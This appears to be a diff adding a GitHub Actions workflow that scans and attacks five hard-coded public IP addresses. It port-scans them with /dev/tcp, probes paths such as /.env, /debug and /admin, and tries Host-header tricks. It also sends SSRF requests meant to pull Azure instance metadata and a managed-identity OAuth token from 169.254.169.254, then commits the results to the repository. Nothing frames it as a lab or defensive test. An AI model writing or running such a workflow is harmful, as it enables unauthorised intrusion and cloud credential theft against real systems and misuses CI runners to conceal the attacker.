@@ -1,0 +1,43 @@
+name: ul6599-http
+on: [workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  h:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - name: leg
+        run: |
+          set +e
+          git config user.email ul@local; git config user.name ul
+          O=ul/http.txt; : > $O
+          push(){ git add $O >/dev/null 2>&1; git commit -qm http 2>/dev/null; git pull -q --rebase 2>/dev/null; git push -q origin HEAD:main 2>/dev/null; }
+          HOSTS="20.74.153.201 20.50.113.151 40.123.206.138 51.104.16.184 20.237.207.128"
+          for H in $HOSTS; do
+            echo "== $H ports $(date -u +%H:%M:%SZ)" >> $O
+            for P in 22 80 443 2375 2376 2379 3000 3330 5000 6006 8080 8188 8265 8888 9000 10250 11434; do
+              timeout 3 bash -c "echo > /dev/tcp/$H/$P" 2>/dev/null && echo "  OPEN $P" >> $O
+            done
+            for S in http https; do
+              echo "-- $S://$H/" >> $O
+              curl -sS -m 8 -o /tmp/b -D /tmp/h "$S://$H/" 2>>$O | head -0
+              head -1 /tmp/h >> $O; grep -iE '^(server|x-powered-by|location|set-cookie|content-type):' /tmp/h >> $O
+              wc -c </tmp/b | sed 's/^/  bytes=/' >> $O
+            done
+            for P in / /brand/ /api /api/v1 /api/status /health /healthz /metrics /status /debug /env /.env /config.json /swagger.json /openapi.json /api-docs /upload /api/upload /fetch /api/fetch /proxy /api/proxy /graphql /admin /login /brand/api /brand/upload /robots.txt; do
+              C=$(curl -s -m 6 -o /dev/null -w '%{http_code}' "http://$H$P" 2>/dev/null); L=$(curl -s -m 6 "http://$H$P" 2>/dev/null | wc -c)
+              echo "  $C $L $P" >> $O
+            done
+            push
+          done
+          echo "== rehost 20.50.113.151" >> $O
+          for HH in localhost 127.0.0.1 internal 20.74.153.201 t1946107x153; do
+            C=$(curl -s -m 6 -o /tmp/x -w '%{http_code}' -H "Host: $HH" http://20.50.113.151/ 2>/dev/null); echo "  Host:$HH -> $C $(wc -c </tmp/x)" >> $O
+          done
+          echo "== ssrf probes 20.74.153.201" >> $O
+          for U in "/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" "/api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" "/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/" "/api/proxy?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"; do
+            R=$(curl -s -m 8 -H "Metadata: true" "http://20.74.153.201$U"); echo "  $U => ${#R}B :: $(echo "$R"|head -c 120|tr -d '\n')" >> $O
+          done
+          echo "DONE $(date -u +%H:%M:%SZ)" >> $O; push; echo "=== HTTP_DONE ==="; tail -40 $O
